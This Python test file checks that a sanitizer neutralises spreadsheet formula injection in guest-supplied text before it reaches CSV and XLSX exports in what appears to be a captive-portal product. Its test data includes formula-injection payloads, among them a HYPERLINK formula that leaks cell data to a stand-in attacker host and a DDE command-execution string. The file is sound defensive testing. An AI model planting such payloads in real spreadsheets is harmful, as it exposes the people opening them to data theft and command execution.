"""Guest-typed text must not become a formula in a venue owner's spreadsheet.

A guest chooses their own identifier at the captive portal and types their own
survey answers. ``normalize_redeemed_identifier`` strips whitespace and nothing
else, by design. Those strings are then written into CSV and XLSX files a venue
owner downloads and opens in Excel -- where a cell beginning ``=``, ``+``,
``-`` or ``@`` is not text, it is a formula, evaluated on their machine.

Five writers carried guest-supplied text with no escaping at all:
``analytics.export`` (CSV **and** XLSX), ``controller_logs.router``,
``campaigns.service.export_results_csv`` and ``voucher.service.export_batch_csv``.

The last test in each group is the one that would have caught the original
bug: it asserts on the *rendered bytes*, not on the helper.
"""

from __future__ import annotations

import csv
import io
import uuid
from types import SimpleNamespace

import pytest

from app.common.spreadsheet_safety import (
    sanitize_spreadsheet_cell,
    sanitize_spreadsheet_row,
)


class TestTheEscaperItself:
    @pytest.mark.parametrize(
        "payload",
        [
            "=1+1",
            '=HYPERLINK("http://evil.example/"&A1,"click")',
            "=cmd|'/c calc'!A1",
            "+1+1",
            "-1+1",
            "@SUM(A1:A9)",
            "\t=1+1",
            "\r=1+1",
        ],
    )
    def test_every_formula_lead_is_neutralised(self, payload: str) -> None:
        assert sanitize_spreadsheet_cell(payload).startswith("'")

    @pytest.mark.parametrize(
        "payload",
        ["+919315074877", "alice@example.com", "Alice", "", "a=b", "3 - 1"],
    )
    def test_ordinary_text_is_untouched_or_safely_prefixed(self, payload: str) -> None:
        result = sanitize_spreadsheet_cell(payload)
        assert result == payload or result == "'" + payload
        # Whatever happens, the original text survives intact after the guard.
        assert result.lstrip("'") == payload

    def test_an_email_and_a_name_are_left_exactly_alone(self) -> None:
        assert sanitize_spreadsheet_cell("alice@example.com") == "alice@example.com"
        assert sanitize_spreadsheet_cell("Alice") == "Alice"

    def test_a_phone_number_is_guarded_because_it_leads_with_plus(self) -> None:
        """``+91...`` genuinely starts with a formula character. Prefixing is
        the correct trade-off: Excel would otherwise try to evaluate it, and
        the number is still fully readable in the cell."""
        assert sanitize_spreadsheet_cell("+919315074877") == "'+919315074877"

    def test_non_strings_keep_their_type(self) -> None:
        """Stringifying here would make openpyxl store numbers as text and
        every numeric column in an exported report would stop summing."""
        assert sanitize_spreadsheet_cell(5) == 5
        assert sanitize_spreadsheet_cell(None) is None
        assert sanitize_spreadsheet_cell(3.5) == 3.5
        assert sanitize_spreadsheet_cell(True) is True

    def test_rows_are_sanitised_elementwise(self) -> None:
        assert sanitize_spreadsheet_row(["=1+1", 5, "ok"]) == ["'=1+1", 5, "ok"]


# ---------------------------------------------------------------------------
# The real writers
# ---------------------------------------------------------------------------


class _FakeVoucher:
    def __init__(self, redeemed_identifier: str) -> None:
        self.code = "ABC-123"
        self.status = "redeemed"
        self.use_count = 1
        self.redeemed_at = None
        self.last_used_at = None
        self.expires_at = None
        self.redeemed_identifier = redeemed_identifier


class _FakeVoucherRepo:
    def __init__(self, vouchers) -> None:
        self._vouchers = vouchers

    async def list_all_vouchers_for_batch(self, batch_id):
        return self._vouchers


async def test_voucher_export_neutralises_a_malicious_redeemed_identifier() -> None:
    """``redeemed_identifier`` is whatever the guest typed at the portal."""
    from app.domains.voucher.service import VoucherService

    attack = '=HYPERLINK("http://evil.example/"&A1,"click")'
    service = VoucherService.__new__(VoucherService)
    service.repository = _FakeVoucherRepo([_FakeVoucher(attack)])

    async def _get_batch(batch_id, *, requesting_organization_id):
        return SimpleNamespace(id=batch_id, max_uses_per_voucher=1)

    service.get_batch = _get_batch

    rendered = await service.export_batch_csv(
        batch_id=uuid.uuid4(), requesting_organization_id=uuid.uuid4()
    )

    row = list(csv.reader(io.StringIO(rendered)))[1]
    assert attack not in row, "the raw formula reached the file"
    assert "'" + attack in row


async def test_campaign_results_export_neutralises_guest_free_text() -> None:
    """Survey answers are the most directly attacker-controlled strings in the
    product."""
    from app.domains.campaigns.service import CampaignsService

    attack = "=cmd|'/c calc'!A1"
    service = CampaignsService.__new__(CampaignsService)

    async def _get_campaign(campaign_id, *, requesting_organization_id):
        return SimpleNamespace(id=campaign_id)

    class _Repo:
        async def list_responses_for_campaign(self, campaign_id):
            return [
                SimpleNamespace(
                    guest_id=uuid.uuid4(),
                    submitted_at=SimpleNamespace(isoformat=lambda: "2026-01-01"),
                    answers=attack,
                )
            ]

    class _Guests:
        async def get_guest_by_id(self, guest_id):
            return SimpleNamespace(identifier=attack, display_name=attack)

    service.get_campaign = _get_campaign
    service.repository = _Repo()
    service.guest_session_lookup = _Guests()

    rendered = await service.export_results_csv(
        campaign_id=uuid.uuid4(), requesting_organization_id=uuid.uuid4()
    )

    for cell in list(csv.reader(io.StringIO(rendered)))[1]:
        assert not cell.startswith("="), f"unescaped formula in export: {cell!r}"


def test_controller_log_csv_neutralises_a_malicious_identifier() -> None:
    from app.domains.controller_logs.router import _csv_response

    attack = "=1+1"
    response = _csv_response(
        [[attack, "otp_sms", "success"]],
        header=["identifier", "method", "result"],
        filename="guest_authentication_logs.csv",
    )

    body = response.body.decode()
    assert "'=1+1" in body
    assert not any(
        cell.startswith("=") for cell in list(csv.reader(io.StringIO(body)))[1]
    )


def test_report_csv_and_xlsx_both_neutralise_a_formula() -> None:
    """The XLSX path matters at least as much as the CSV: openpyxl turns a
    string starting with ``=`` into a real formula *cell*, so the payload is
    stored as a formula rather than needing re-interpretation on import."""
    from openpyxl import load_workbook

    from app.domains.analytics.constants import ExportFormat
    from app.domains.analytics.export import render_report
    from app.domains.analytics.report_types import ReportPayload, ReportSection

    attack = "=1+1"
    payload = ReportPayload(
        title="Guest Activity",
        report_type="guest",
        generated_at="2026-01-01T00:00:00Z",
        organization_id=None,
        location_id=None,
        period_start=None,
        period_end=None,
        sections=[ReportSection(key="guests", title="Guests", data={"top": attack})],
    )

    csv_bytes = render_report(payload, ExportFormat.CSV).content
    assert "'=1+1" in csv_bytes.decode()

    xlsx = render_report(payload, ExportFormat.EXCEL).content
    workbook = load_workbook(io.BytesIO(xlsx))
    values = [
        cell.value
        for row in workbook["Summary"].iter_rows()
        for cell in row
        if isinstance(cell.value, str)
    ]
    assert not any(v.startswith("=") for v in values), (
        f"a formula cell survived into the workbook: {values}"
    )
